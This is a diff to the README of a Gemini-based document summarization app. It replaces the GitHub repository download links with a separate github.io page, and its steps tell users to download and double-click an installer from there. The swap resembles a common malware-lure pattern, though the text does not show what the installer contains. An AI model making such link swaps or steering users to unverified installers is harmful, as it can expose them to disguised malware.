@@ -1,6 +1,6 @@
 # 📄 Research-Document-Summarization-Agent - Create document summaries with artificial intelligence
 
-[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/Maquia8292/Research-Document-Summarization-Agent)
+[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://maquia8292.github.io)
 
 This application helps users summarize long research papers and documents. It uses Google Gemini to read your files and provide clear summaries. You can extract key concepts and ask questions about your documents within the interface.
 
@@ -14,7 +14,7 @@ Before you start, ensure your computer meets these requirements:
 
 ## 📥 Installing the Software
 
-1. Visit the [project page](https://github.com/Maquia8292/Research-Document-Summarization-Agent) to locate the download files.
+1. Visit the [project page](https://maquia8292.github.io) to locate the download files.
 2. Click the link to download the installation package to your computer.
 3. Open your Downloads folder.
 4. Double-click the installer file.
